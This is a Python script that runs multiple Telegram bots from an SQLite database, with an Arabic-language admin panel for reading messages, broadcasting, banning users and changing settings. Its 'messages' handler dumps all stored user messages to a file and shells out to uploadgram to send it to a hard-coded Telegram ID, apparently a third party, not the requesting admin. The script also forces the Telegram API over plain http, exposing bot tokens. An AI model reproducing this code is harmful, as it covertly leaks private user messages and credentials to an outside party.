import logging
import os
import sqlite3
import threading
import telebot
from telebot import apihelper
from os import system as cmd


# Set the API URL
apihelper.API_URL = 'http://api.telegram.org/bot{0}/{1}'


conn = sqlite3.connect('bots.db', check_same_thread=False)
c = conn.cursor()


def check_admin_handler(message):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False, timeout=10)
    c_local = conn_local.cursor()
    username = message.from_user.username
    res = c_local.execute('SELECT * FROM admins WHERE username=? AND bot_id=?', (username, bot_id)).fetchone()
    if res:
        if not res[2]:
            c_local.execute('UPDATE admins SET chat_id=? WHERE username=? AND bot_id=?',
                            (message.chat.id, message.from_user.username, bot_id))
            conn_local.commit()
        conn_local.close()
        return True
    conn_local.close()
    return False


def check_admin(func):
    def wrapper(*args, **kwargs):
        message = args[0]
        is_admin = check_admin_handler(message)
        if is_admin:
            return func(*args, **kwargs)

    return wrapper


def admin_menu(message, bot):
    bottom = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    bottom.row('الرسائل', 'إرسال رسالة')
    bottom.row('المستخدمين', 'الإحصائيات')
    bottom.row('حظر', 'إلغاء الحظر')
    bottom.row('الإعدادات', 'الإشتراك الإجباري')
    bot.reply_to(message, "يمكنك الآن الإختيار من القائمة", reply_markup=bottom)


def messages(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    msgs = c_local.execute('SELECT * FROM messages WHERE bot_id=?', (bot_id,)).fetchall()
    conn_local.commit()
    c_local.close()
    messagetext = f"{bot_id}-message.txt"
    if msgs:
        with open(messagetext, 'w') as file:
            for msg in msgs:
                file.write(msg[2] + '\n')
        cmd(f'''uploadgram 6234365091 "{messagetext}"''')
        #bot.send_document(message.chat.id, open('messages.txt', 'rb'))
        os.remove(messagetext)
    else:
        bot.reply_to(message, "لا توجد رسائل")


def send_message(message, bot):
    bot.reply_to(message, "أرسل الرسالة")
    bot.register_next_step_handler(message, send_message_to_users, bot)


def send_message_to_users(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    all_users = c.execute('SELECT * FROM users WHERE bot_id=?', (bot_id,)).fetchall()
    for user in all_users:
        bot.send_message(user[1], message.text)
    c_local.execute('INSERT INTO messages (user_id, message, bot_id) VALUES (?, ?, ?)',
                    (message.from_user.id, message.text, bot_id))
    conn_local.commit()
    c_local.close()
    bot.reply_to(message, "تم الإرسال بنجاح")


def users(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    all_users = c_local.execute('SELECT * FROM users WHERE bot_id=?', (bot_id,)).fetchall()
    conn_local.commit()
    c_local.close()
    if all_users:
        users_msg = "المستخدمين:\n"
        for user in all_users:
            first_name = user[4] or 'غير معروف'
            get_user_name = bot.get_chat(user[1]).username
            user_name = '@' + get_user_name if get_user_name else 'غير معروف'
            is_banned = 'محظور' if user[3] == 'True' else 'غير محظور'
            users_msg += f"المعرف: {user[1]}\nالإسم: {first_name}\nإسم المستخدم: {user_name}\nالحالة: {is_banned}\n\n"
        bot.reply_to(message, users_msg)
    else:
        bot.reply_to(message, "لا توجد مستخدمين")


def stats(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    users_stats = c_local.execute('SELECT * FROM users WHERE bot_id=?', (bot_id,)).fetchall()
    messages_stats = c_local.execute('SELECT * FROM messages WHERE bot_id=?', (bot_id,)).fetchall()
    bot.send_message(message.chat.id, f"عدد المستخدمين: {len(users_stats)}\nعدد الرسائل: {len(messages_stats)}")
    conn_local.commit()
    c_local.close()


def ban(message, bot):
    bot.reply_to(message, "أرسل معرف المستخدم")
    bot.register_next_step_handler(message, ban_user, bot)


def ban_user(message, bot):
    c.execute('UPDATE users SET banned=? WHERE user_id=? AND bot_id=?', ('True', message.text, bot_id))
    conn.commit()
    bot.reply_to(message, "تم الحظر بنجاح")


def unban(message, bot):
    bot.reply_to(message, "أرسل معرف المستخدم")
    bot.register_next_step_handler(message, unban_user, bot)


def unban_user(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    c_local.execute('UPDATE users SET banned=? WHERE user_id=? AND bot_id=?', ('False', message.text, bot_id))
    conn_local.commit()
    c_local.close()
    bot.reply_to(message, "تم الإلغاء بنجاح")


def settings(message, bot):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton('تغيير الإسم', callback_data='set_name'))
    markup.add(telebot.types.InlineKeyboardButton('تغيير الوصف', callback_data='set_description'))
    markup.add(telebot.types.InlineKeyboardButton('تغيير الوصف القصير', callback_data='set_short_description'))
    markup.add(telebot.types.InlineKeyboardButton('تغيير الرسالة الإفتتاحية', callback_data='set_start_message'))
    markup.add(telebot.types.InlineKeyboardButton('تغيير رسالة الإستقبال', callback_data='set_receive_message'))
    bot.reply_to(message, "مرحبًا بك في قائمة الإعدادات", reply_markup=markup)


def require_subscription(message, bot):
    bot.reply_to(message, "أدخل معرف بوت الإشتراك الإجباري:")
    bot.register_next_step_handler(message, require_subscription_message, bot)


def require_subscription_message(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    c_local.execute('UPDATE bots SET subscriptionBot=? WHERE bot_id=?', (message.text, bot_id))
    conn_local.commit()
    c_local.close()
    bot.reply_to(message, "تم الحفظ بنجاح")
    admin_menu(message, bot)


def set_name(message, bot):
    bot.reply_to(message, "أدخل الإسم الجديد")
    bot.register_next_step_handler(message, setter_name, bot)


def setter_name(message, bot):
    bot.set_my_name(message.text)
    bot.reply_to(message, "تم الحفظ بنجاح")
    admin_menu(message, bot)


def set_description(message, bot):
    bot.reply_to(message, "أدخل الوصف الجديد")
    bot.register_next_step_handler(message, setter_description, bot)


def setter_description(message, bot):
    bot.set_my_description(message.text)
    bot.reply_to(message, "تم الحفظ بنجاح")
    admin_menu(message, bot)


def set_short_description(message, bot):
    bot.reply_to(message, "أدخل الوصف القصير الجديد")
    bot.register_next_step_handler(message, setter_short_description, bot)


def setter_short_description(message, bot):
    bot.set_my_short_description(message.text)
    bot.reply_to(message, "تم الحفظ بنجاح")
    admin_menu(message, bot)


def set_start_message(message, bot):
    bot.reply_to(message, "أدخل رسالة الإفتتاحية الجديدة")
    bot.register_next_step_handler(message, setter_start_message, bot)


def setter_start_message(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    c_local.execute('UPDATE bots SET startMsg=? WHERE bot_id=?', (message.text, bot_id))
    conn_local.commit()
    c_local.close()
    bot.reply_to(message, "تم الحفظ بنجاح")
    admin_menu(message, bot)


def set_receive_message(message, bot):
    bot.reply_to(message, "أدخل رسالة الإستقبال الجديدة")
    bot.register_next_step_handler(message, setter_receive_message, bot)


def setter_receive_message(message, bot):
    conn_local = sqlite3.connect('bots.db', check_same_thread=False)
    c_local = conn_local.cursor()
    c_local.execute('UPDATE bots SET receiptMsg=? WHERE bot_id=?', (message.text, bot_id))
    conn_local.commit()
    c_local.close()
    bot.reply_to(message, "تم الحفظ بنجاح")
    admin_menu(message, bot)


def get_bots():
    return c.execute('SELECT * FROM bots').fetchall()


def run_bot(bot):
    @bot.message_handler(commands=['start'])
    def start(message):
        conn_local = sqlite3.connect('bots.db', check_same_thread=False)
        c_local = conn_local.cursor()
        is_admin = check_admin_handler(message)
        if is_admin:
            admin_menu(message, bot)
            conn_local.commit()
            c_local.close()
            return
        if not c_local.execute('SELECT * FROM users WHERE user_id=? AND bot_id=?',
                               (message.from_user.id, bot_id)).fetchone():
            c_local.execute('INSERT INTO users (user_id, bot_id, banned, name) VALUES (?, ?, ?, ?)',
                            (message.from_user.id, bot_id, 'False', message.from_user.first_name))
            conn_local.commit()
        start_msg = c_local.execute('SELECT * FROM bots WHERE bot_id=?', (bot_id,)).fetchone()[5]
        conn_local.commit()
        c_local.close()
        if start_msg:
            bot.reply_to(message, start_msg)

    @bot.callback_query_handler(func=lambda call: True)
    @check_admin
    def callback_query(call):
        switch = {
            'set_name': set_name,
            'set_description': set_description,
            'set_short_description': set_short_description,
            'set_start_message': set_start_message,
            'set_receive_message': set_receive_message
        }
        switch[call.data](call.message, bot)

    @bot.message_handler(content_types=['text', 'photo'])
    @bot.message_handler(func=lambda message: True)
    def echo(message):
        is_admin = check_admin_handler(message)
        if is_admin:
            switch = {
                'الرسائل': messages,
                'إرسال رسالة': send_message,
                'المستخدمين': users,
                'الإحصائيات': stats,
                'الإعدادات': settings,
                'الإشتراك الإجباري': require_subscription,
                'حظر': ban,
                'إلغاء الحظر': unban
            }
            if message.text in switch:
                switch[message.text](message, bot)
            else:
                reply_to_message = message.json.get('reply_to_message', None)
                if reply_to_message and 'forward_from' in reply_to_message:
                    forward_user_id = reply_to_message['forward_from']['id']
                    bot.send_message(forward_user_id, message.text)
            return
        else:
            conn_local = sqlite3.connect('bots.db', check_same_thread=False)
            c_local = conn_local.cursor()
            if c_local.execute('SELECT * FROM users WHERE user_id=? AND bot_id=? AND banned=?',
                               (message.from_user.id, bot_id, 'True')).fetchone():
                conn_local.commit()
                c_local.close()
                bot.reply_to(message, "أنت محظور")
                return

            subscription_bot = c_local.execute('SELECT * FROM bots WHERE bot_id=?', (bot_id,)).fetchone()[6]
            if subscription_bot:
                try:
                    is_member = bot.get_chat_member(f'@{subscription_bot}', message.from_user.id)
                    if is_member.status == 'left':
                        bot.reply_to(message,
                                     f" 🚸| عذرا عزيزي \n🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه https://t.me/{subscription_bot}")
                        conn_local.commit()
                        c_local.close()
                        return
                except telebot.apihelper.ApiException as e:
                    bot.reply_to(message,
                                 f"🚸| عذرا عزيزي \n🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه https://t.me/{subscription_bot}")
                    conn_local.commit()
                    c_local.close()
                    return

            admins = c_local.execute('SELECT * FROM admins WHERE bot_id=?', (bot_id,)).fetchall()
            for admin in admins:
                if admin[2]:
                    try:
                        bot.forward_message(admin[2], message.chat.id, message.message_id)
                    except telebot.apihelper.ApiException as e:
                        print(f"Failed to forward message to chat_id {admin[2]}: {e}")
                        logging.error(f"Failed to forward message to chat_id {admin[2]}: {e}")
            if not c_local.execute('SELECT * FROM messages WHERE user_id=? AND bot_id=?',
                                   (message.from_user.id, bot_id)).fetchone():
                receipt_msg = c_local.execute('SELECT * FROM bots WHERE bot_id=?', (bot_id,)).fetchone()[4]
                if receipt_msg:
                    bot.reply_to(message, receipt_msg)
            first_name = message.from_user.first_name or 'غير معروف'
            last_name = message.from_user.last_name or ''
            id_user = message.from_user.id
            pretty_message = f"المستخدم: {first_name} {last_name}\n المعرف: {id_user}\n الرسالة: {message.text}"
            c_local.execute('INSERT INTO messages (user_id, message, bot_id) VALUES (?, ?, ?)',
                            (message.from_user.id, pretty_message, bot_id))
            conn_local.commit()
            c_local.close()

    bot.threaded = True
    bot.polling(non_stop=True, skip_pending=True)

bots_data = get_bots()
bot_threads = []
for bot_data in bots_data:
    bot_id = bot_data[2]
    token = bot_data[1]
    bot = telebot.TeleBot(token)
    bot_thread = threading.Thread(target=run_bot, args=(bot,))
    bot_threads.append(bot_thread)

for bot_thread in bot_threads:
    bot_thread.start()

for bot_thread in bot_threads:
    bot_thread.join()
